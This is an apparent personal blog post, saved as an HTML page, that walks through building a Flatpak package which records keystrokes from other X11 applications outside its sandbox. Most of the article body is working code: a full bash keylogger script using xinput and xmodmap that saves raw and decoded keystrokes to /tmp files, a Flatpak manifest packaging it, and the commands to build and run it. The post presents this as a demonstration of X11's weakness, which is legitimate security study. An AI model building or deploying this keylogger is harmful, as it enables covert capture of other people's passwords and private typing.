<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="X11 has been a widely used windowing system on Unix platforms for decades, but its security vulnerabilities have become increasingly apparent. As the transition to the more secure Wayland windowing sy">
<meta property="og:type" content="article">
<meta property="og:title" content="💻 Flatpak Development: X11 Keylogger">
<meta property="og:url" content="https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/index.html">
<meta property="og:site_name" content="Gloria&#39;s Notebook">
<meta property="og:description" content="X11 has been a widely used windowing system on Unix platforms for decades, but its security vulnerabilities have become increasingly apparent. As the transition to the more secure Wayland windowing sy">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s2.loli.net/2023/04/13/xGOQMofyZPzKgI4.png">
<meta property="og:image" content="https://s2.loli.net/2023/04/13/orqhtu168pRXyHP.png">
<meta property="og:image" content="https://s2.loli.net/2023/04/13/SimbBKaNyC6efxk.png">
<meta property="og:image" content="https://s2.loli.net/2023/04/13/fOFU8LcgtdQuMS9.png">
<meta property="og:image" content="https://s2.loli.net/2023/04/13/RZfgD6ri2jzvsFk.png">
<meta property="article:published_time" content="2023-04-04T21:06:13.000Z">
<meta property="article:modified_time" content="2023-04-13T01:49:29.298Z">
<meta property="article:author" content="Gloria Su">
<meta property="article:tag" content="Linux">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2023/04/13/xGOQMofyZPzKgI4.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/iconmonstr-cat-1-240.png">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/iconmonstr-cat-1-240.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/iconmonstr-cat-1-240.png">
        
      
    
    <!-- title -->
    <title>💻 Flatpak Development: X11 Keylogger</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Gloria's Notebook" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
  <div id="wallpaper" style="background-image: url(&quot;https://s2.loli.net/2023/03/29/y6h1NuejsoG3JYI.png&quot;);background-size: auto;background-repeat: repeat;position: absolute;inset: 0;background-position: center; position: fixed;"></div>
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/projects/">Projects</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2023/07/09/Migration-Guide-Vue2-Nuxt2-Vuetify2-to-Vue3-Nuxt3-Vuetify3/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/02/06/Quickstart-with-Rollup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&text=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&title=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&is_video=false&description=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=💻 Flatpak Development: X11 Keylogger&body=Check out this article: https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&title=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&title=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&title=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&title=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&name=💻 Flatpak Development: X11 Keylogger&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&t=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment"><span class="toc-number">1.</span> <span class="toc-text">Environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Build-a-Flatpak"><span class="toc-number">2.</span> <span class="toc-text">Build a Flatpak</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Install-a-runtime-and-the-matching-SDK"><span class="toc-number">2.1.</span> <span class="toc-text">1. Install a runtime and the matching SDK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Create-a-script-named-as-keylogger-sh"><span class="toc-number">2.2.</span> <span class="toc-text">2. Create a script named as keylogger.sh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Add-a-manifest-named-org-flatpak-keylogger-yml"><span class="toc-number">2.3.</span> <span class="toc-text">3. Add a manifest named org.flatpak.keylogger.yml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Build-the-application"><span class="toc-number">2.4.</span> <span class="toc-text">4. Build the application</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Test-the-build"><span class="toc-number">2.5.</span> <span class="toc-text">5. Test the build</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Screenshot"><span class="toc-number">3.</span> <span class="toc-text">Screenshot</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-I-type-in-terminal"><span class="toc-number">3.1.</span> <span class="toc-text">What I type in terminal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-mapping-of-keyboard-keylogger-keyboard-txt"><span class="toc-number">3.2.</span> <span class="toc-text">The mapping of keyboard: keylogger_keyboard.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-original-keyboard-input-keylogger-output-txt"><span class="toc-number">3.3.</span> <span class="toc-text">The original keyboard input: keylogger_output.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-keyboard-input-after-mapping-keylogger-final-output-txt"><span class="toc-number">3.4.</span> <span class="toc-text">The keyboard input after mapping: keylogger_final_output.txt</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        💻 Flatpak Development: X11 Keylogger
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Gloria Su</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-04-04T21:06:13.000Z" itemprop="datePublished">2023-04-04</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Coding/">Coding</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/Linux/" rel="tag">Linux</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>X11 has been a widely used windowing system on Unix platforms for decades, but its security vulnerabilities have become increasingly apparent. As the transition to the more secure Wayland windowing system is slow, X11 remains in use in many Linux distributions as the default window system. One of the insecure aspects of X11 is the ability to perform keylogging with a simple one-line shell command using the xinput command.<br>In this blog post, we will explore how to create a Flatpak, a sandboxed application package, that can eavesdrop on keyboard entries of other applications outside of its sandbox in an X11 window session.</p>
<h2 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h2><ul>
<li><strong>Environment</strong>: VMware Fusion, Fedora 37, X11</li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/X_Window_System"><strong>X11</strong></a>: X11 is a windowing system used on Unix-like operating systems for bitmap displays.</li>
<li><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Flatpak"><strong>Flatpak</strong></a>: Flatpak is a Linux utility for software deployment and package management that provides a sandbox environment to run applications in isolation from the system.</li>
<li>You should be logged into the X11 windowing environment for the keylogger to work, confirm by executing <code>echo $XDG_SESSION_TYPE</code>.</li>
</ul>
<h2 id="Build-a-Flatpak"><a href="#Build-a-Flatpak" class="headerlink" title="Build a Flatpak"></a>Build a Flatpak</h2><h3 id="1-Install-a-runtime-and-the-matching-SDK"><a href="#1-Install-a-runtime-and-the-matching-SDK" class="headerlink" title="1. Install a runtime and the matching SDK"></a>1. Install a runtime and the matching SDK</h3><p>Install the freedesktop Platform and SDK runtimes from Flathub, which are used to build and run Flatpak applications.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flatpak install flathub org.freedesktop.Platform//22.08 org.freedesktop.Sdk//22.08</span><br></pre></td></tr></table></figure>

<h3 id="2-Create-a-script-named-as-keylogger-sh"><a href="#2-Create-a-script-named-as-keylogger-sh" class="headerlink" title="2. Create a script named as keylogger.sh"></a>2. Create a script named as keylogger.sh</h3><p>The script sets up a keylogger by capturing key input events, modifying them to replace key codes with their corresponding key values, and storing the modified events in a file.<br>Let’s go through the main parts of the code:</p>
<p><strong><code>trap_commands()</code></strong>: This is a function that defines the actions to be taken when the script receives a <code>SIGINT</code> signal, which is generated when the script is interrupted with <code>^C</code>. This function reads key mapping data from <code>/tmp/keylogger_keyboard.txt</code> and key input events from <code>/tmp/keylogger_output.txt</code>. It then uses this data to replace key codes with their corresponding key values in the input events, and writes the modified events to <code>/tmp/keylogger_final_output.txt</code>. Finally, the function prints “Finished” and exits with a status code of 0.</p>
<p><strong><code>trap &#39;trap_commands&#39; SIGINT</code></strong>: This registers the <code>trap_commands</code> function to be executed when the script receives a <code>SIGINT</code> signal.</p>
<p><strong><code>xmodmap -pke &gt; /tmp/keylogger_keyboard.txt</code></strong>: This command generates a list of key mappings using xmodmap and writes the output to <code>/tmp/keylogger_keyboard.txt</code>. This file contains the mapping between key codes and their corresponding key values.</p>
<p><strong><code>xinput test $(xinput list | grep &#39;Keyboard Name&#39; | sed &#39;s/.*id=\([0-9]*\).*/\1/&#39;) &gt; /tmp/keylogger_output.txt</code></strong>: This command captures key input events using xinput and writes the output to <code>/tmp/keylogger_output.txt</code>. This file contains the raw key input events that will be processed by the script.<br>Find the name of your keyboard by the list of <code>libinput list-devices</code>, then replace ‘Keyboard Name’ with your keyboard name.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hide terminal output for ^C</span></span><br><span class="line"><span class="built_in">stty</span> -echoctl</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define trap function to execute on SIGINT</span></span><br><span class="line"><span class="function"><span class="title">trap_commands</span></span> () &#123;</span><br><span class="line">    <span class="built_in">declare</span> -A animals</span><br><span class="line">    animals=([<span class="string">&quot;None&quot;</span>]=<span class="string">&quot;None&quot;</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;animals[None]&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">read</span> p; <span class="keyword">do</span></span><br><span class="line">        key_id=$(<span class="built_in">echo</span> <span class="variable">$p</span> | <span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27; &#x27;</span> -f2)</span><br><span class="line">        key_value=$(<span class="built_in">echo</span> <span class="variable">$p</span> | <span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27; &#x27;</span> -f4)</span><br><span class="line">        animals[<span class="string">&quot;<span class="variable">$key_id</span>&quot;</span>]=<span class="string">&quot;<span class="variable">$key_value</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span> &lt;/tmp/keylogger_keyboard.txt</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;new record start...&quot;</span> &gt; /tmp/keylogger_final_output.txt</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">read</span> q; <span class="keyword">do</span></span><br><span class="line">        key_id=$(<span class="built_in">echo</span> <span class="variable">$q</span> | <span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span> | <span class="built_in">cut</span> -d<span class="string">&#x27; &#x27;</span> -f3)</span><br><span class="line">        <span class="keyword">if</span> [[ -v <span class="string">&quot;animals[<span class="variable">$key_id</span>]&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">            new_value=<span class="string">&quot;<span class="variable">$&#123;animals[$key_id]&#125;</span>&quot;</span></span><br><span class="line">            (<span class="built_in">echo</span> <span class="variable">$q</span> | sed <span class="string">&quot;s/<span class="variable">$key_id</span>/<span class="variable">$new_value</span>/&quot;</span>) &gt;&gt; /tmp/keylogger_final_output.txt</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span> &lt;/tmp/keylogger_output.txt</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;\rFinished. &quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Register trap function with SIGINT signal</span></span><br><span class="line"><span class="built_in">trap</span> <span class="string">&#x27;trap_commands&#x27;</span> SIGINT</span><br><span class="line"></span><br><span class="line"><span class="comment"># Record key presses with xinput and xmodmap</span></span><br><span class="line">xmodmap -pke &gt; /tmp/keylogger_keyboard.txt</span><br><span class="line">xinput <span class="built_in">test</span> $(xinput list | grep <span class="string">&#x27;Keyboard Name&#x27;</span> | sed <span class="string">&#x27;s/.*id=\([0-9]*\).*/\1/&#x27;</span>) &gt; /tmp/keylogger_output.txt</span><br></pre></td></tr></table></figure>

<h3 id="3-Add-a-manifest-named-org-flatpak-keylogger-yml"><a href="#3-Add-a-manifest-named-org-flatpak-keylogger-yml" class="headerlink" title="3. Add a manifest named org.flatpak.keylogger.yml"></a>3. Add a manifest named org.flatpak.keylogger.yml</h3><p>The building process includes three modules: “keylogger”, “xinput”, and “xmodmap”. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">app-id: org.flatpak.keylogger</span><br><span class="line">runtime: org.freedesktop.Platform</span><br><span class="line">runtime-version: <span class="string">&#x27;22.08&#x27;</span></span><br><span class="line">sdk: org.freedesktop.Sdk</span><br><span class="line"><span class="built_in">command</span>: keylogger.sh</span><br><span class="line">modules:</span><br><span class="line">  - name: keylogger</span><br><span class="line">    buildsystem: simple</span><br><span class="line">    build-commands:</span><br><span class="line">      - install -D keylogger.sh /app/bin/keylogger.sh</span><br><span class="line">    sources:</span><br><span class="line">      - <span class="built_in">type</span>: file</span><br><span class="line">        path: keylogger.sh</span><br><span class="line">  - name: xinput</span><br><span class="line">    buildsystem: autotools</span><br><span class="line">    build-commands:</span><br><span class="line">      - make</span><br><span class="line">      - make install</span><br><span class="line">    sources:</span><br><span class="line">      - <span class="built_in">type</span>: git</span><br><span class="line">        url: https://github.com/freedesktop/xorg-xinput.git</span><br><span class="line">  - name: xmodmap</span><br><span class="line">    buildsystem: autotools</span><br><span class="line">    build-commands:</span><br><span class="line">      - make</span><br><span class="line">      - make install</span><br><span class="line">    sources:</span><br><span class="line">      - <span class="built_in">type</span>: git</span><br><span class="line">        url: https://github.com/freedesktop/xmodmap.git</span><br></pre></td></tr></table></figure>

<h3 id="4-Build-the-application"><a href="#4-Build-the-application" class="headerlink" title="4. Build the application"></a>4. Build the application</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flatpak-builder build-dir org.flatpak.keylogger.yml</span><br></pre></td></tr></table></figure>
<p>Your file structure of <code>org.flatpak.keylogger</code> should look like this:<br><img src="https://s2.loli.net/2023/04/13/xGOQMofyZPzKgI4.png" alt="file.png"></p>
<h3 id="5-Test-the-build"><a href="#5-Test-the-build" class="headerlink" title="5. Test the build"></a>5. Test the build</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flatpak-builder --user --install --force-clean build-dir org.flatpak.keylogger.yml</span><br><span class="line">flatpak run --socket=x11 --filesystem=/tmp org.flatpak.keylogger</span><br></pre></td></tr></table></figure>

<h2 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h2><h3 id="What-I-type-in-terminal"><a href="#What-I-type-in-terminal" class="headerlink" title="What I type in terminal"></a>What I type in terminal</h3><p><img src="https://s2.loli.net/2023/04/13/orqhtu168pRXyHP.png" alt="type-in.png"></p>
<h3 id="The-mapping-of-keyboard-keylogger-keyboard-txt"><a href="#The-mapping-of-keyboard-keylogger-keyboard-txt" class="headerlink" title="The mapping of keyboard: keylogger_keyboard.txt"></a>The mapping of keyboard: keylogger_keyboard.txt</h3><p><img src="https://s2.loli.net/2023/04/13/SimbBKaNyC6efxk.png" alt="keylogger_keyboard.png"></p>
<h3 id="The-original-keyboard-input-keylogger-output-txt"><a href="#The-original-keyboard-input-keylogger-output-txt" class="headerlink" title="The original keyboard input: keylogger_output.txt"></a>The original keyboard input: keylogger_output.txt</h3><p><img src="https://s2.loli.net/2023/04/13/fOFU8LcgtdQuMS9.png" alt="keylogger_output.png"></p>
<h3 id="The-keyboard-input-after-mapping-keylogger-final-output-txt"><a href="#The-keyboard-input-after-mapping-keylogger-final-output-txt" class="headerlink" title="The keyboard input after mapping: keylogger_final_output.txt"></a>The keyboard input after mapping: keylogger_final_output.txt</h3><p><img src="https://s2.loli.net/2023/04/13/RZfgD6ri2jzvsFk.png" alt="keylogger_final_output.png"></p>
<hr>
<p>References:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://docs.flatpak.org/en/latest/first-build.html">https://docs.flatpak.org/en/latest/first-build.html</a></li>
<li><a target="_blank" rel="noopener" href="http://techtrickery.com/keyloggers.html">http://techtrickery.com/keyloggers.html</a></li>
</ul>
<p>📮 If find any errors, please feel free to discuss and correct them: <a href="mailto:&#98;&#115;&#x75;&#53;&#64;&#110;&#99;&#115;&#x75;&#x2e;&#x65;&#x64;&#117;">&#98;&#115;&#x75;&#53;&#64;&#110;&#99;&#115;&#x75;&#x2e;&#x65;&#x64;&#117;</a>.</p>

  </div>
</article>


<script type="text/javascript" id="clustrmaps" src="//clustrmaps.com/map_v2.js?d=LAScMVNC13lGc72rIqINM2L1yFfiJg8h4Xr5pHR7doA&cl=ffffff&w=a"></script>
        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/projects/">Projects</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Environment"><span class="toc-number">1.</span> <span class="toc-text">Environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Build-a-Flatpak"><span class="toc-number">2.</span> <span class="toc-text">Build a Flatpak</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Install-a-runtime-and-the-matching-SDK"><span class="toc-number">2.1.</span> <span class="toc-text">1. Install a runtime and the matching SDK</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Create-a-script-named-as-keylogger-sh"><span class="toc-number">2.2.</span> <span class="toc-text">2. Create a script named as keylogger.sh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Add-a-manifest-named-org-flatpak-keylogger-yml"><span class="toc-number">2.3.</span> <span class="toc-text">3. Add a manifest named org.flatpak.keylogger.yml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Build-the-application"><span class="toc-number">2.4.</span> <span class="toc-text">4. Build the application</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Test-the-build"><span class="toc-number">2.5.</span> <span class="toc-text">5. Test the build</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Screenshot"><span class="toc-number">3.</span> <span class="toc-text">Screenshot</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-I-type-in-terminal"><span class="toc-number">3.1.</span> <span class="toc-text">What I type in terminal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-mapping-of-keyboard-keylogger-keyboard-txt"><span class="toc-number">3.2.</span> <span class="toc-text">The mapping of keyboard: keylogger_keyboard.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-original-keyboard-input-keylogger-output-txt"><span class="toc-number">3.3.</span> <span class="toc-text">The original keyboard input: keylogger_output.txt</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-keyboard-input-after-mapping-keylogger-final-output-txt"><span class="toc-number">3.4.</span> <span class="toc-text">The keyboard input after mapping: keylogger_final_output.txt</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&text=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&title=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&is_video=false&description=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=💻 Flatpak Development: X11 Keylogger&body=Check out this article: https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&title=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&title=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&title=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&title=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&name=💻 Flatpak Development: X11 Keylogger&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://beking0912.github.io/2023/04/04/Flatpak-Development-A-11-Keylogger/&t=💻 Flatpak Development: X11 Keylogger"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023-2024
    Gloria Su
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/projects/">Projects</a></li><!--
     --><!--
